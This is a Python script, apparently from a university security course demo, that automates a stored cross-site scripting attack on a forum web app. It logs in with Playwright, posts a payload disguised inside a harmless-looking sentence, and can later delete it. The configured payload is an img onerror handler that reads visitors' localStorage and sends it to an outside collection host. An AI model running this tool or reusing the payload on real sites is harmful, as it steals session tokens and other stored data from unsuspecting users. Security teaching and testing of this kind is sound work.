from dataclasses import dataclass
from typing import Literal

from playwright.sync_api import TimeoutError
from playwright.sync_api import sync_playwright


@dataclass
class XssAttackToolConfig:
    target_app_url: str
    target_app_username: str
    target_app_password: str

    xss_payload: str
    xss_payload_container: str = "I looked up at the sky tonight and"
    xss_payload_identifier: str = "counted 812.13 stars."

    @property
    def attack_payload(self) -> str:
        return f"{self.xss_payload_container} {self.xss_payload_identifier} {self.xss_payload}"


class XssAttackTool:
    def __init__(self, config: XssAttackToolConfig):
        self.config = config

        self.browser = sync_playwright().start().chromium.launch(headless=False)
        self.context = self.browser.new_context()
        self.page = self.context.new_page()

    def _login(self) -> bool:
        self.page.goto(self.config.target_app_url)
        self.page.fill("#username", self.config.target_app_username)
        self.page.fill("#password", self.config.target_app_password)
        self.page.click("button:has-text('Sign In')")

        try:
            self.page.wait_for_url("**/forum", timeout=5000)
        except TimeoutError:
            return False

        return True

    def _logout(self) -> bool:
        if not self.page.url.endswith("/forum"):
            return False

        self.page.click("button:has-text('Logout')")

        try:
            self.page.wait_for_url("**/", timeout=5000)
        except TimeoutError:
            return False

        return True

    def _enable_attack(self) -> bool:
        self.page.wait_for_selector(".loading-container", state="hidden")

        content = self.page.content()
        if self.config.xss_payload_identifier in content:
            return False

        self.page.fill("textarea#content", self.config.attack_payload)
        self.page.click("button:has-text('Publish Post')")
        self.page.wait_for_selector(f"text={self.config.xss_payload_identifier}")

        return True

    def _disable_attack(self) -> bool:
        self.page.wait_for_selector(".loading-container", state="hidden")

        content = self.page.content()
        if self.config.xss_payload_identifier not in content:
            return False

        posts = self.page.query_selector_all(".thread-card")
        for post in posts:
            html = post.inner_html()
            if self.config.xss_payload_identifier in html:
                delete_btn = post.query_selector(".delete-button")
                if delete_btn:
                    delete_btn.click()
                    self.page.wait_for_timeout(1000)

        return True

    def execute(self, operation: Literal["enable", "disable"]) -> bool:
        if not self._login():
            return False

        if operation == "enable":
            result = self._enable_attack()
        else:
            result = self._disable_attack()

        if not self._logout():
            return False

        return result


if __name__ == '__main__':
    config = XssAttackToolConfig(
        target_app_url="https://elec0138-forum.0138019.xyz/",
        target_app_username="xss_demo",
        target_app_password="xss_demo_password",
        xss_payload="""<img src="x" onerror="const d={dt:'elec0138-xss',ls:JSON.stringify(localStorage)};new Image().src='https://elec0138-fc.meeska.me/collect?'+new URLSearchParams(d)">"""
    )

    attack_tool = XssAttackTool(config)
    attack_tool.execute("disable")
